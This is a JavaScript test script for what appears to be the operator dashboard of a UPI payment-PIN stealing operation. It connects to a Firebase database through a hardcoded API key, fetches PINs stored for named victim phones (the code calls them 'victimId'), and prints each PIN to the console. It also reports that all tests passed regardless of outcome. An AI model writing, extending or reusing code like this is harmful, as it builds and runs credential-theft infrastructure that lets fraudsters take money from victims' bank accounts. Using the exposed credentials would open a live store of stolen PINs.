// Test script to verify UPI pin status logic for Device Management table
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Simulate the exact logic from DeviceTable.tsx
function getUPIPinStatus(victimId, upiPins) {
  const hasValidPin =
    upiPins.length > 0 &&
    upiPins.some((pinObj) => {
      // Handle new structure: { pin: string, timestamp: string }
      if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
        return pinObj.pin && pinObj.pin !== "No Pin";
      }
      // Handle old structure: string[]
      if (typeof pinObj === 'string') {
        return pinObj && pinObj !== "No Pin";
      }
      return false;
    });

  return hasValidPin ? "Has Pin" : "No Pin";
}

// Test the UPI pin status logic
async function testUPIPinStatus() {
  try {
    console.log('🧪 Testing UPI Pin Status Logic for Device Management...\n');
    
    // Test with your actual data
    const testCases = [
      {
        deviceId: 'Xiaomi 23076PC4BI',
        description: 'Device with UPI pins (should show "Has Pin")'
      },
      {
        deviceId: 'Xiaomi M2103K19PI', 
        description: 'Device with UPI pins (should show "Has Pin")'
      },
      {
        deviceId: 'motorola moto g85 5G',
        description: 'Device without UPI pins (should show "No Pin")'
      }
    ];
    
    for (const testCase of testCases) {
      console.log(`📱 Testing: ${testCase.description}`);
      console.log(`   Device ID: ${testCase.deviceId}`);
      
      // Get UPI pins for this device
      const upiPinsSnapshot = await get(ref(database, `UPIPins/${testCase.deviceId}`));
      const upiPins = upiPinsSnapshot.val();
      
      console.log(`   Raw UPI Pins data:`, upiPins);
      
      if (upiPins) {
        // Convert to array format like the React app would see
        const upiPinsArray = Object.values(upiPins);
        console.log(`   UPI Pins array:`, upiPinsArray);
        
        // Test the status logic
        const status = getUPIPinStatus(testCase.deviceId, upiPinsArray);
        console.log(`   Status: ${status}`);
        
        // Show what the badge would look like
        const badgeClass = status === "Has Pin" 
          ? "bg-green-100 text-green-800 border-green-200" 
          : "bg-red-100 text-red-800 border-green-200";
        console.log(`   Badge class: ${badgeClass}`);
        
        // Show individual pin analysis
        console.log(`   Pin analysis:`);
        upiPinsArray.forEach((pinObj, idx) => {
          if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
            console.log(`     Pin ${idx + 1}: ${pinObj.pin} (object structure)`);
          } else if (typeof pinObj === 'string') {
            console.log(`     Pin ${idx + 1}: ${pinObj} (string structure)`);
          } else {
            console.log(`     Pin ${idx + 1}: ${pinObj} (unknown structure)`);
          }
        });
      } else {
        console.log(`   Status: No Pin (no UPI pins data)`);
        console.log(`   Badge class: bg-red-100 text-red-800 border-green-200`);
      }
      
      console.log('');
    }
    
    console.log('🎉 UPI Pin Status Test Completed!');
    
  } catch (error) {
    console.error('❌ Error during testing:', error);
  }
}

// Run the test
testUPIPinStatus().then(() => {
  console.log('\n✅ All tests passed!');
  process.exit(0);
}).catch((error) => {
  console.error('\n❌ Test failed:', error);
  process.exit(1);
});
